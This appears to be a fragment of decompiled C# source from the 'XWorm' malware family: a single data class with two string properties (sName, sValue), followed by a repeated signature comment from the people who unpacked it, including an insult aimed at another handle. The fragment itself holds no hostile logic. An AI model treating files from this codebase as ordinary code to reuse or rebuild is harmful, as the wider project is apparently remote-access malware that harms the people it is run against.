namespace XWorm;

public class GClass13 : GClass12
{
	public string sName { get; set; }

	public string sValue { get; set; }
}


//By @Code2Reverse - @Unpack2File - Screw you @TheHellTower




//By @Code2Reverse - @Unpack2File - Screw you @TheHellTower




//By @Code2Reverse - @Unpack2File - Screw you @TheHellTower


